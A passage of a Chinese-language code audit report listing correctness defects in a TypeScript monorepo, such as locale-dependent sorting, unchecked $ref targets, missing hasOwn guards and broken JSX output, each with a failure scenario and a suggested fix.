**详情**: convertSchemaNode 对以 #/$defs/__prodivix_openapi__ 开头的 $ref 直接 entries.push([$ref, entry]) 放行(485-488行),不校验目标是否存在;collectComponentDefinitionReferences(538-547行)对未知组件名只是跳过。结果生成的 JSON Schema 2020-12 携带无法解析的 $ref,而 proposal 状态为 ready、issues 为空。另外 attachComponentDefinitions(635-641行)用 Object.fromEntries 合并时组件定义排在后面,会静默覆盖作者自定义的同名 defs 定义。

**失败场景**: OpenAPI 组件 schema 内含 $ref 指向 #/$defs/__prodivix_openapi__Typo(Typo 非组件名),导入成功、无任何 issue;采纳后该 schema 在运行时校验器(如 ajv)中因无法解析引用而对任何输入报错,依赖它的 operation 的入参/出参校验全部失败。

**修复建议**: 放行前校验 #/$defs/**prodivix_openapi** 后的名字属于 componentNames,否则出 unsupportedShape issue 阻断;或把已存在的同名本地 defs 视为冲突报错,避免被组件定义静默覆盖。

##### M-C-24 input-change 去重摘要在 execute 之前写入,失败执行会永久抑制同输入再次派发

- **位置**: [`packages/data/src/dataDispatchRuntime.ts:567`](packages/data/src/dataDispatchRuntime.ts#L567)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-data

**详情**: 第 567-568 行 inputByQueryKey.set(key, queryInputDigest) 发生在第 569 行 await options.execute 之前,且 execute 失败时没有任何清理(对比 replayKey 在第 517、562 行对早期失败都有 dispatchIds.delete 补偿)。第 524-525 行只要摘要相等即返回 status skipped-unchanged 且不产生 invocation。于是上次执行失败与上次执行成功在去重表里不可区分。

**失败场景**: 查询经 input-change 触发绑定搜索框:用户输入 chair,执行因网络错误失败(生命周期为 error);网络恢复后用户改成 chair2 再改回 chair,新的 input-change 派发解析出同一 mappedInput,摘要命中,返回 skipped-unchanged,execute 永不调用;界面停留在第一次失败的 error 状态,除非用 refresh 触发或文档修订变化,否则同值输入再也发不出请求。

**修复建议**: 仅在 options.execute 成功返回后写入 inputByQueryKey;或在 execute 抛错时删除该 key 对应的摘要(与 replayKey 的失败补偿保持一致)。

**验证备注**: dataDispatchRuntime.ts 567-568 行在 569 行 await execute 前写 inputByQueryKey,无 catch 补偿(对比 517/562 行 replayKey 有 delete);524-525 行摘要命中即返回 skipped-unchanged 不调 execute。生产调用方 browserDataExecutionEnvironment 传入 executeDataOperation,网络失败时如实标记 error。

##### M-C-25 规范键排序使用 localeCompare:规范形/哈希依赖宿主 locale 且非全序,与 dataDocument 不一致

- **位置**: [`packages/data/src/dataJsonRuntime.ts:40`](packages/data/src/dataJsonRuntime.ts#L40)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-data

**详情**: 核心成立,但 dataAuthoring.ts:59 的 digest 仅用于 dataAuthoring.ts:193 进程内 digest(current)===digest(next) 的 no-change 比较,两侧同环境计算、未持久化,跨环境危害被夸大。真正跨环境受影响的是缓存键(dataCacheRuntime:352)、幂等键(dataIdempotency:61)与经 workspacePirDataOperationBindingTransaction.ts:403 写入 PIR 文档持久化的 normalizeDataOperationInputBinding 规范形。排序等价键返回 0(软连字符/NFD)已实测。

**失败场景**: 同一 Data 输入绑定含键 A 与 a,在无 full-ICU 的 Node(CLI/CI/vscode 扩展)与浏览器中规范化出不同键序,持久化字节与内容摘要不同,跨环境产生虚假已修改/修订漂移;缓存键侧则表现为逻辑相同的输入在不同环境命中不同键。含排序等价键的对象在同一环境内也会因插入顺序不同得到不同规范形。

**修复建议**: 统一改用码位比较(dataDocument.ts 的 compareText 或默认码位排序),消除对宿主 locale/ICU 的依赖并与文档解码层的规范序保持一致。

**验证备注**: 已确认。dataJsonRuntime:40、dataIdempotency:24、dataCacheRuntime:255、dataDispatchRuntime:203/342 均用 localeCompare;cache/idempotency 产物进 sha256 键(352、61)。normalizeDataOperationInputBinding 注释称 persisted 规范形,经 workspacePirDataOperationBindingTransaction.ts:403 持久化。

##### M-C-26 runDataOperationTest 比较键序被重排的 actual 与原始 expected,逻辑相等也报 mismatch

- **位置**: [`packages/data/src/dataOperationTest.ts:147`](packages/data/src/dataOperationTest.ts#L147)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-data

**详情**: 第 133 行 actual.value = cloneDataJsonValue(result.result.value),而 cloneDataJsonValue(dataJsonRuntime.ts:39-40)会用 localeCompare 对对象键重排并冻结;input.test.expected.value 从未规范化,第 71 行 stableJson 只是 JSON.stringify(value)(不排序键)。第 147 行 stableJson(actual.value) 不等于 stableJson(input.test.expected.value) 因此比较的是规范键序与作者书写键序。已确认 Web 调用方 DataOperationTestPanel.tsx 的 parseJson 就是原生 JSON.parse(保留插入顺序),触发路径真实存在。

**失败场景**: 用户在测试面板把 fixture 与 expected 都写成 name x 加 id 1:执行结果经 clone 排序为 id 1 加 name x,expected 保持 name 先 id 后;第 147 行字符串不等,DATA_TEST_VALUE_MISMATCH,report.status=failed,尽管两个值逻辑完全相等。任何键序与 locale 排序不一致(如倒序、混合大小写键)的期望值都会产生假失败。

**修复建议**: 对 expected.value 做与实际值相同的规范化(同一 cloneDataJsonValue),或将 stableJson 改为按键排序的规范序列化,使两侧以同一规范形比较。

**验证备注**: 读 dataJsonRuntime.ts:37-50 确认 clone 用 localeCompare 排序对象键;dataOperationTest.ts:133 仅对 actual.value 做 clone,expected.value 全程未规范化,:71 stableJson 即 JSON.stringify 不排序,:147 字符串比较。DataOperationTestPanel.tsx:22 parseJson=JSON.parse 保留插入序。

##### M-C-27 两个节点绑定同一 executor.slotId 时槽位投影被静默折叠

- **位置**: [`packages/nodegraph/src/authoring/nodeGraphCodeSlotProvider.ts:85`](packages/nodegraph/src/authoring/nodeGraphCodeSlotProvider.ts#L85)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-ng-anim

**详情**: duplicateNode(nodeGraphNodeActions.ts:148-152)原样展开 data.executor(同 slotId),经 toCanonicalNodeGraphDocument(:211)落盘;decodeNodeGraphDocument 与后端 validator 均不校验跨节点 executor.slotId 唯一。provider 按 node.id 排序(53-54)后 Map 后写覆盖,getSlot/getBindingProjection 返回 id 字典序最大节点的 ownerRef(不一定是副本),而 list 系列仍返回两条同 id 记录,queryCodeSlotSemanticRelations 据此定位错误 owner。

**失败场景**: 复制一个已绑定代码执行器的节点(新 node id、原样保留 executor.slotId,解码通过),getSlot(slotId)/getBindingProjection(slotId) 只返回副本节点的 ownerRef;对原节点做重命名/重绑定的 owner-impact 预览定位到错误节点,原节点的 binding projection 经 get 接口不可达,语义侧却为两节点各发出一条 code-reference。

**修复建议**: 在 decodeNodeGraphDocument 中对 executor.slotId 做跨节点唯一性校验(fail closed);或 provider 构建时对重复 slotId 报告 issue/按节点派生唯一键,而不是用 Map 静默去重。

**验证备注**: 真实可达:NodeGraphEditorContent.tsx:422 绑定 executor 时 slotId 派生自 nodeId;duplicateNode(:148)以新 id 复制节点但保留 data.executor,落盘后两节点 slotId 相同。nodeGraphCodec.ts 仅校验 node/port/edge id 唯一,后端 nodegraph_validator.go 同。provider 53-54 排序后 85-88 行 Map 静默去重。

##### M-C-28 toReactEventName 兜底分支生成错误大小写的 React 事件名,白名单外事件处理器静默失效

- **位置**: [`packages/pir-react-renderer/src/runtime/reactProjection.ts:14`](packages/pir-react-renderer/src/runtime/reactProjection.ts#L14)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-pir-renderer

**详情**: toReactEventName 只特判 click/change/input/submit/focus/blur 六个事件与已匹配 on 加大写字母 的名字,其余一律 on 加首字母大写(第14行)。keydown 到 onKeydown、dblclick 到 onDblclick、mouseenter 到 onMouseenter、touchstart 到 onTouchstart、contextmenu 到 onContextmenu 等均不在 React 事件注册表中。PIRElementProjection.tsx:107 用该返回值作为宿主元素 prop 名挂载 dispatchPirTrigger 回调,React 永远不会分发这些事件。编辑器侧 useBlueprintEditorInspectorController.ts:1057 用 click/onclick 判重,证明创作侧确实使用小写 DOM 事件名。

**失败场景**: PIR element 节点 events 写为 keydown 绑定 call-code,渲染出的 span/div 得到 onKeydown prop,React 不识别该事件名,不注册监听,用户按键时触发器永不执行,且无任何诊断;所有非六个白名单的小写 DOM 事件(dblclick/mouseenter/touchstart 等)同样静默失效。

**修复建议**: 按 React 已知事件表做完整映射(keydown 到 onKeyDown、mouseenter 到 onMouseEnter、dblclick 到 onDoubleClick、animationend 到 onAnimationEnd 等),或改为 camelCase 转换;无法识别的事件名应 fail closed 并产出 blocking issue。

##### M-C-29 logic.dataById 输入码槽的 semanticReferenceId 与语义索引引用事实 ID 永远不一致

- **位置**: [`packages/pir/src/authoring/pirCodeSlotProvider.ts:162`](packages/pir/src/authoring/pirCodeSlotProvider.ts#L162)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-pir

**详情**: 核心成立。补充:除 dataById 斜杠不一致外,component-instance 的 call-code 投影用 fieldPath /bindings/events/X(provider:197),事实侧用 /bindings/events/X/trigger(pirSemanticBindingFacts.ts:797),存在另一处 /trigger 后缀不一致;trigger 两侧一致仅对 element 事件成立。

**失败场景**: 文档 logic.dataById.q.input 为 code 绑定 slotId s reference artifactId a input literal 1 时,索引中引用事实 id 含 15:input/reference,码槽 binding projection 携带 16:/input/reference。queryCodeSlotSemanticRelations 用 projection.semanticReferenceId 调 getDefinition 返回 missing,该 Data 输入 transform 槽被误判 reference-missing:代码槽导航、引用/影响面查询、CodeArtifact 孤儿/重绑生命周期对 document 级 data input 码全部失效。

**修复建议**: 将 pirCodeSlotProvider.ts:162 的 /input 改为 input,与 pirSemanticGraphFacts.ts:257 对齐(或两侧统一为 /input),并补充跨模块 id 一致性测试。

**验证备注**: provider:160-162 以 /input 起算、173-179 生成 id 末段 /input/reference;facts:257 以 input 起算、219-228 生成 input/reference。semanticIds.ts:5-6 长度前缀编码使 15:input/reference 不等于 16:/input/reference。createWorkspaceSemanticIndex.ts:172/262 getDefinition 精确查 reference。

##### M-C-30 数组非索引数字字符串键绕过 validateJsonValue 全量校验

- **位置**: [`packages/plugin-contracts/src/jsonValue.ts:141`](packages/plugin-contracts/src/jsonValue.ts#L141)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-plugin-contracts

**详情**: 核心结论属实并已实测复现。仅原失败场景中 validatePluginManifest 含 list a 例子不精确:裸 list a 会被 ajv 的 schema 校验拒绝。真正端到端可达路径是把函数挂到合法数组字段(如 manifest.capabilities 的大数字键 等于 空函数),此时 length 不变,validatePluginManifest 返回 ok:true 且函数存活。validateJsonValue 对该污染数组返回 ok:true 无争议(同样可混入 Map/Date/自环)。

**失败场景**: 数组 a 初始 [1],a 的大数字字符串键(如 99999999999)赋空函数(或 new Map、或 a 自身),validateJsonValue(a)/validatePluginManifest(含 list a) 返回 ok:true,而普通对象上同样的值会被 NON_JSON_VALUE 拒绝。内联 contribution descriptor 或程序化 manifest 借此把回调/React 值/环混入纯 JSON 数据,下游按 ownKeys 递归的深拷贝/冻结/沙箱传递将带入函数或触发无限递归。

**修复建议**: 只接受真数组索引:将正则检查改为 const n = Number(key); Number.isInteger(n) 且 n 大于等于 0 且 n 小于 2 的 32 次方减 1 且 String(n) === key 且 n 小于 array.length,否则视为命名属性拒绝;或在索引循环后额外校验 ownKeys.length === array.length + 1,确保不存在 length 之外的可枚举自有属性。

**验证备注**: 已读 jsonValue.ts:138-142 用正则筛命名属性,未限定真数组索引也不与 array.length 比较;151行循环仅遍历 0 到 array.length。故大数字键成可枚举自有属性、不改 length,既过 find 又落在循环外,值不被校验。实测含函数/Map/自环的此类数组返回 ok:true;177-189行对象分支遍历全部 ownKeys 能拒绝。

##### M-C-31 esm-sh 策略把 @version 追加到含子路径的 source 之后,生成无效导入 URL

- **位置**: [`packages/prodivix-compiler/src/core/packageResolver.ts:57`](packages/prodivix-compiler/src/core/packageResolver.ts#L57)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-pir-renderer

**详情**: 函数级缺陷确实存在且可直接复现;但端到端整个 bundle 失败需调用方显式传 strategy esm-sh,当前仓库所有调用方(documentCompiler/workspaceProject/golden-conformance/ExportCode)均用 npm,故该分支目前是潜在缺陷,无产品路径触发,实际影响面为零,直至有消费方启用 esm-sh 策略。

**失败场景**: resolvePackageImport(@heroicons/react/24/outline, strategy esm-sh, packageVersions 含 @heroicons/react 2.2.0) 返回 importSource=https://esm.sh/@heroicons/react/24/outline@2.2.0;react/importRegistry.ts:65 的 addAdapterImports 直接消费该 URL 写入导出模块,生成的导出工程 Vite 构建/运行时解析该 URL 404,整个 bundle 失败。

**修复建议**: 先用 getPackageName 拆出包名与子路径,带版本时生成 base 加 packageName@version 再加子路径;无版本时保持原 source。

**验证备注**: 确认。packageResolver.ts:57 把 @version 拼在整段 source 后;getPackageName(23-30) 能拆出 @heroicons/react 且按包名查到版本,但未拆分子路径。@heroicons/react/24/outline 加 ver2.2.0 得 .../@heroicons/react/24/outline@2.2.0,而正确格式 PKG@VER/PATH。

##### M-C-32 受控 JSX 投影用 JSON 字符串字面量输出 node id 属性,含引号的 id 生成非法 JSX

- **位置**: [`packages/prodivix-compiler/src/react/controlledReactJsx.ts:206`](packages/prodivix-compiler/src/react/controlledReactJsx.ts#L206)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-compiler-react

**详情**: 核心成立但有一处不准:真正缺陷是 id/slotMemberId 含双引号。renderNode(L206/L203)用 toStableJson=JSON.stringify 输出,btn 加双引号 1 输出为带反斜杠转义的字符串,反斜杠转义在 JSX 属性字符串字面量里不生效,引号提前闭合,语法非法。实测 projectPirDocumentToControlledReactJsx 返回 ready 且 body 含该非法属性,回读 parseControlledReactJsxToPirDocument 永久 blocked(CONTROLLED_REACT_JSX_SYNTAX_INVALID)。但含换行 id 得到错误 id 一句不准:TS 的 StringLiteral .text 会解码转义,往返其实正确。建议修复(改用 JSX 表达式)正确。

**失败场景**: PIR 文档含节点 id 为 btn 加双引号 1,projectPirDocumentToControlledReactJsx 返回 ready 且 body 是语法非法的 JSX,createControlledCodeDocumentsPlan 成功写入一个受控区即坏掉的 Code 文档;之后 createControlledCodeEditPlan 扫描该文档时 parseControlledReactJsxToPirDocument 永久返回 CONTROLLED_REACT_JSX_SYNTAX_INVALID,该文档的受控编辑链路卡死。

**修复建议**: 与 text/props 一致,用 JSX 表达式形式输出:ATTR 等于 花括号包 toStableJson(node.id)(JSON 字符串即合法 JS 字符串字面量,TS 解析后 .text 为解码值),或实现 JSX 属性专用的实体转义。

**验证备注**: renderNode L206-208/203 用 ATTR=toStableJson(id),toStableJson=JSON.stringify(L90-91)。validatePirDocument 仅 isNonEmptyString(pirValidator L72-73,368)无字符集限制,btn 加引号 1 通过。端到端实测:projection status=ready、body 含非法属性;回读 parse 永久 blocked。

##### M-C-33 适配器返回的默认 props 会静默覆盖同名的非字面量绑定

- **位置**: [`packages/prodivix-compiler/src/react/nodeCompiler.ts:250`](packages/prodivix-compiler/src/react/nodeCompiler.ts#L250)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-compiler-react

**详情**: compileElement 先用 node.props 的非字面量绑定填 propExpressions(238-246 行),再用 for 遍历 adapterResult.props 无条件 propExpressions.set(key, toJson(value))(247-251 行)覆盖同名键。createAdapterNode 只把字面量 props 交给适配器,codegenPolicy 的 applyPropsTransform 以 defaults 展开加 node.props(仅字面量)合并,因此策略 defaults 中与非字面量绑定同名的键会进入 adapterResult.props。

**失败场景**: codegen policy 规则为某元素配置 props.defaults variant primary,作者在 PIR 中把 variant 绑定到 state,生成的 TSX 输出静态 variant primary,state 绑定表达式被 Map.set 覆盖丢弃,界面状态切换失效且无编译诊断。

**修复建议**: 第二个循环只在键不存在于 propExpressions(即没有非字面量绑定占用)时写入;或让 applyPropsTransform 感知非字面量绑定键,避免 defaults 覆盖绑定键。

**验证备注**: 机制可达:createAdapterNode(85行)只传字面量;applyPropsTransform(codegenPolicy.ts:151-155)按 defaults 加字面量合并,默认值进入 adapterResult.props;compileElement 第一轮241行只跳过字面量,非字面量绑定必写入 propExpressions,第二轮250行无条件用静态默认覆盖状态绑定,无诊断。

##### M-C-34 乐观更新在遍历 trackedQueries 中途抛错,已改写的快照无回滚

- **位置**: [`packages/prodivix-compiler/src/react/standaloneDataRuntime.ts:634`](packages/prodivix-compiler/src/react/standaloneDataRuntime.ts#L634)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-compiler-react

**详情**: throw 同时跳过 651 行 publish,幻影值不立即渲染,而在下一次任意 publish 时可见;覆写需该 key 再次 runQuery(activated 去重使 document 激活重挂载也不自动重取,幻影可长期留存)。同缺陷适用于 636 行 matches.length 大于 1 的 AMBIGUOUS 抛错。触发不限于两个在挂载实例:trackedQueries 从不裁剪,卸载实例的陈旧 success 快照同样可命中并先写后抛。

**失败场景**: 同一列表被两个文档实例渲染(两个 trackedQueries 命中 optimistic.target),对只存在于第一个列表中的实体派发 update,第一个快照写入幻影值后,第二个列表 matches.length===0 抛错,突变根本没发送到服务端,但第一个列表持久显示幻影修改,直到下次无关重取数才覆盖。

**修复建议**: 先对全部目标查询做校验/计算变更,再统一写入快照;或把已写入的 changes 收集起来,在抛错前恢复 before 快照(复用 settle rollback 逻辑)。

**验证备注**: 确认可达。applyOptimisticMutation 在 for trackedQueries(614)中每命中 target 即 snapshots.set(642) 写入,settle 回滚句柄循环后才定义(652/676);后续 key matches.length===0 抛 ENTITY_IDENTITY_MISSING(633-634)时已写快照无回滚。dispatchDataMutation 调用(879)在 try(886)外,异常直穿。

##### M-C-35 独立导出的 App 从不向页面传 __pdxParamsById,路由参数绑定恒为 undefined

- **位置**: [`packages/prodivix-compiler/src/react/workspaceProject.ts:1105`](packages/prodivix-compiler/src/react/workspaceProject.ts#L1105)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-compiler-react

**详情**: React 独立导出 App(workspaceProject.ts:1105)渲染 Page 时不传 __pdxParamsById,模块默认空对象(documentCompiler.ts:518)。因无 defaultValue 回退(区别于预览 createLogicParamValues),受影响范围是所有 logic.props param 符号,不止动态路由页;query 置 input-failure、mutation reject。Vue 导出已正确传 match.params。

**失败场景**: 路由 /users/:id 的页面上,数据绑定 input 用 runtime-value 引用 param 符号,导出运行:activateDataBindings 里 resolveInput 取到 undefined,抛 DATA_INPUT_VALUE_MISSING,该查询快照变 error,依赖路由参数的查询/突变输入在独立导出应用中全部失效,而编辑器内预览正常。

**修复建议**: 在 App 渲染页面时传入 __pdxParamsById={match.params}(或对 match.params 做冻结后传入),与模块契约 __PdxModuleProps.__pdxParamsById 对齐。

**验证备注**: findWorkspaceRoute 已解析 match.params(workspaceProject.ts:884),但 App 仅用于 :988 action,:1105 渲染 Page 只传 __pdxRuntime/__pdxRouteId。模块默认 __pdxParamsById 为空对象(documentCompiler.ts:518),param 符号取 __pdxParamsById[paramId] 恒 undefined。

##### M-C-36 route 运行时代码槽 provider 只遍历 manifest.root,忽略 modules 的运行时引用

- **位置**: [`packages/router/src/routeCodeSlotProvider.ts:99`](packages/router/src/routeCodeSlotProvider.ts#L99)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-tokens-router

**详情**: createRouteRuntimeCodeSlotProvider 仅 for 遍历 flattenRouteManifest(manifest)(99 行)生成 slot/binding,而 flattenRouteManifest 只递归 manifest.root(routeCore.ts:333-336 行 root in manifestOrNode 取 root)。同包 semantic provider 经 contributeRouteModule 遍历 modules 输出 runtime code-reference 事实(routeSemanticContributionProvider.ts:528-531),validateRouteManifest 也校验 module.root 的 runtime(routeCore.ts:1214),三个组件对 modules 的处理口径不一致。

**失败场景**: 在 modules.modA.root 的路由节点声明 runtime.loaderRef,decode 与 Semantic Index 均产出其 code-reference 事实,但 listSlots/listBindingProjections 查不到对应 slot:Code Authoring 无法绑定或展示该 loader,owner 处置动作缺位;仅被 module 路由引用的 CodeArtifact 还可能被误判为孤儿。

**修复建议**: provider 内除 flattenRouteManifest(manifest) 外,再遍历 Object.values(manifest.modules 或空) 的各 root 树生成 slot(以 moduleId 命名空间化 slot id),或要求并校验传入已 compose 的 manifest。

**验证备注**: 确认。routeCodeSlotProvider.ts:99/123 只用 flattenRouteManifest,routeCore.ts:333-336 仅取 root;唯一生产调用 createWorkspaceCodeSlotRegistryFromSnapshot.ts:47 传原始 snapshot.routeManifest(workspaceCodec.ts:538 不 compose)。而 routeSemanticContributionProvider.ts:528-531 遍历 modules。

##### M-C-37 段耗尽时 matchChildren 不进入无 segment 布局节点,其 index 路由永不激活

- **位置**: [`packages/router/src/routeCore.ts:822`](packages/router/src/routeCore.ts#L822)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-tokens-router

**详情**: matchNodeSegments 对无 segment 节点返回 matched true、consumed 0、params 空(753-754 行),说明 pathless layout 是合法匹配者;但 matchChildren 在 if 非 remaining.length(822-829 行)只查找 child 的直接 index 子节点后即返回,不再递归进入 consumed=0 的无段 child;matchRouteManifestEntries 对 / 也只查 root 直接 index(865-874 行)。resolveRouteRuntimeContext 的 exactPath 回退仅在匹配链为空时触发(910-916 行),此场景链非空故不生效。

**失败场景**: manifest root 到 a(segment a)到 layout(无 segment)到 idx(index true)。matchRouteManifest(m,/a) 返回 root,a,idx 不激活;packages/ui/src/nav/PdxRoute.tsx:61 按该链渲染,idx 绑定的页面在 URL /a 上永不显示;而按 routeNodeId idx 导航(resolveRouteMatchChain)能解析出完整链——同一索引路由在路径匹配与按 id 导航间行为不一致。

**修复建议**: remaining 为空时,除直接 index 子节点外,再尝试 consumed=0 的无 segment child(递归 matchChildren,允许其 index 子节点命中),与 pathless layout 语义对齐;/ 分支同理。

##### M-C-38 build bundle 解码用 localeCompare 校验排序,会拒绝码元序的合法 bundle

- **位置**: [`packages/runtime-core/src/executionBuildBundle.ts:129`](packages/runtime-core/src/executionBuildBundle.ts#L129)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-runtime-core

**详情**: decodeExecutionBuildBundle 用 if (path.localeCompare(previousPath) 小于等于 0) throw 校验文件路径单调递增,该比较依赖宿主默认 locale 排序规则;而同类解码器 executionFilesystemDiff.ts:429 对同一语义使用码元比较 change.path 小于等于 previousPath,两处不一致。沙箱构建工具(Go/Rust/POSIX sort)通常按字节/码元序输出文件列表,当路径大小写混合时码元序与 en 排序序相反。

**失败场景**: 沙箱产出 files 为 Vendor.js 与 app.js(码元序 V=0x56 小于 a=0x61,合法且无重复);在 en-US 排序的 Node 运行时解码时 app.js.localeCompare(Vendor.js) 小于 0,抛 files must be uniquely sorted by path,一次本应成功的 build 结果被整体拒绝。

**修复建议**: 与 executionFilesystemDiff 保持一致,改用码元比较 if (path 小于等于 previousPath) throw,并在生产端统一用同一确定性比较器排序。

##### M-C-39 putArtifact 的 grant 幂等比对依赖 JSONB 往返后的键序,几乎必然误报 identity-conflict

- **位置**: [`packages/runtime-remote-postgres/src/postgresExecutionRepository.ts:677`](packages/runtime-remote-postgres/src/postgresExecutionRepository.ts#L677)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-runtime-server

**详情**: 缺陷成立但触发描述不准:677 行用 jsonb 往返后的键序与原始 identity 字符串比对,对 artifactId 优先的 descriptor 恒假,grant 幂等 existing 分支在 Postgres 实现中不可达,与内存实现(同 descriptor、不同 workerEventId 返回 existing)背离。但生产 worker 的 workerEventId 以 lease.attempt 为前缀(workerAgent.ts:650,claimNext 递增 attempt),崩溃重放时 expiresAt=now 加 retention 必变,内存实现同样返回 identity-conflict,该场景两实现无可观测分歧;真实分歧需字节级相同 descriptor 加不同 workerEventId,当前生产调用方不可达。

**失败场景**: worker 崩溃租约过期后,新 attempt 用新 workerEventId 重放同一 artifactId 的 putArtifact:existingEvent 未命中走到 grant 比对,键序不一致,返回 identity-conflict(内存实现为 existing),客户端把合法重放判定为协议冲突,恢复中的执行被中断失败。

**修复建议**: 不要将原始 JSON 字符串存入 JSONB 后再做字符串比对:把 identity 存为 TEXT 列并比对该列,或用排序键的稳定规范化 JSON 同时生成 identity 与落库内容,与内存实现语义对齐。

**验证备注**: 机制属实:656 行 identity 保原键序,726 行 $4::jsonb 落库(schema.ts:118 JSONB),jsonb 按长度优先排序且 node-pg 默认 JSON.parse 回读,677 行比对对 artifactId 优先的 descriptor 恒假,grant 的 existing 分支死代码,与 memory 514-520/573 语义背离。

##### M-C-40 materializeArtifact 校验使用键序敏感的 JSON.stringify 比较,语义等价但键序不同的产物会被误判为身份漂移

- **位置**: [`packages/runtime-remote/src/remoteExecutionProvider.ts:820`](packages/runtime-remote/src/remoteExecutionProvider.ts#L820)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-runtime-remote

**详情**: synchronize 中校验 materializeArtifact 只能追加 uri 时:const expectedProjection = artifact 展开加 uri; if (JSON.stringify(artifact) 不等于 JSON.stringify(expectedProjection)) throw RemoteExecutionRecoveryRequiredError。JSON.stringify 依赖属性插入序,expectedProjection 的键顺序是 wire 解码序(artifactId, kind, label, mediaType, size, digest, sourceTrace, metadata, uri)。同文件已有顺序无关的 canonicalJson(用于 sameSourceTrace)却未用于此处。只要适配器返回语义完全一致、仅追加 uri 但键序不同的对象,就会误判为篡改了持久 artifact 身份。

**失败场景**: preview/production 执行的 bundle artifact 到达时调用 materializeArtifact;适配器从自己的数据库行重建 descriptor 并附加 uri(键序与 wire 序不同),第 820 行 stringify 不相等,抛 RecoveryRequiredError,catch 中恢复计划非 reconnect,emitSynchronizationFailure,一个本应成功的运行中执行被判为 REMOTE_EXECUTION_SYNC_FAILED 而失败,且每次重放事件都在同一处失败。

**修复建议**: 改用顺序无关的比较:逐字段比对(白名单字段加 uri),或复用同文件的 canonicalJson(artifact) === canonicalJson(expectedProjection)。

##### M-C-41 密钥材料/权限的已排序校验使用 localeCompare,结果依赖运行时区域设置

- **位置**: [`packages/server-runtime/src/isolatedServerRuntime.ts:117`](packages/server-runtime/src/isolatedServerRuntime.ts#L117)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-runtime-server

**详情**: 真实可达主路径是密钥字段名:isolated_secret_broker.go:326 sort.Strings 按码点序写出 fields,与 readIsolatedServerFunctionSecretMaterial:117 的 localeCompare 序对混合大小写字段名(Token、apiKey 均合法)互斥,recipient 抛错致函数不可执行。readAuthorityPermissions(174-180)同缺陷,但当前内置权限 ID 全小写(workspace.owner/read/write),两序一致,该半仅理论可达。建议统一复用 compareText。

**失败场景**: 函数声明两个密钥字段 Token 与 apiKey:按代码点序 Token,apiKey 写出的材料文件在 en-US ICU 环境被本校验拒绝;按区域序 apiKey,Token 写出则被 recipient 的代码点序校验拒绝。同一输入在不同 Node ICU/区域配置下时过时不过,密钥解析整体失败,该 server function 不可执行。

**修复建议**: 所有规范化排序校验改用代码点比较(复用 serverRuntimeAuthConfiguration 的 compareText 或 小于/大于 运算),保证与生产方 .sort() 及任意运行环境一致。

**验证备注**: isolatedServerRuntime.ts:117 与 174-180 用 localeCompare 强制 ICU 序;生产方 isolated_secret_broker.go:326 sort.Strings 按字节/码点序写 JSON,配套校验 remoteWorkerSecretRecipient.ts:128、rootlessPodmanSandbox.ts:274 用默认 .sort()(码点序)。字段名经 isCanonicalId 校验。

##### M-C-42 token 引用解析未做 hasOwn 守卫,constructor 等引用会解析到 Object.prototype 成员

- **位置**: [`packages/themes/src/resolver/resolveTokenReferences.ts:75`](packages/themes/src/resolver/resolveTokenReferences.ts#L75)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-plugin-antd-themes

**详情**: getTokenValue 用 const value = tokens[path] 或 fallbackTokens[path] 直接以下标查普通对象。当引用路径是 constructor、toString、**proto** 这类裸名时(extractReferencePath 的正则允许),取到的是 Object.prototype 上的函数/对象而非 undefined,因此不会抛 Unknown theme token reference。同一泄漏还出现在:第 43 行缓存查找 context.resolvedTokens[path](对 constructor 直接返回函数作为缓存值)、detectTokenCycles.ts:57 的 tokens[path](使该引用被视为可解析、不出环也不报错)、tokenPaths.ts:115/121 的 SEMANTIC_CSS_VARIABLES[path](对 constructor 取到 Object 构造函数,truthy,被当作变量名)。已用与源码一致的逻辑实测:constructor 解析为 function Object。

**失败场景**: 社区/自定义主题清单含 semantic.accent.default 引用 constructor,validateThemeManifest 返回 valid:true(应 fail closed 报未知引用);resolveThemeManifest 的 resolvedTokens 含函数值,违反 ThemeTokenPrimitive(string|number)类型契约;createCssVariables 经 tokenPaths 泄漏输出 --accent-color: var(function Object) 之类无效 CSS。当前 app 只投喂官方清单,故运行时暂不触发,但该包是发布 API 且 ThemeSource 明确支持 custom/community,校验闸门在此失守。

**修复建议**: 所有以引用串为键的查表改用 Object.hasOwn 守卫(或用 Object.create(null) 构建索引):getTokenValue 与 detectTokenCycles 中先 hasOwn 再取值;resolveTokenValue 缓存查找同样先 hasOwn;tokenPaths 的 SEMANTIC/PRODUCT 映射表查找加 hasOwn。

